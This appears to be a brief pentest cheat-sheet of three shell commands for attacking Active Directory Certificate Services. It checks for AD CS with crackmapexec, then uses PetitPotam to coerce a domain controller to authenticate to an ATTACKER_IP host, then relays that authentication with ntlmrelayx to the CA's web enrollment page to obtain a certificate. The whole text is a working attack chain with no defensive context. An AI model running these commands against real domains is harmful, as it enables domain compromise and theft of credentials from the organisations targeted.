# Check for AD CS
crackmapexec ldap $DC -u user -p pass -M adcs

# Exploit
python3 PetitPotam.py -d domain.local -u user -p pass ATTACKER_IP $DC

# Relay to AD CS
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs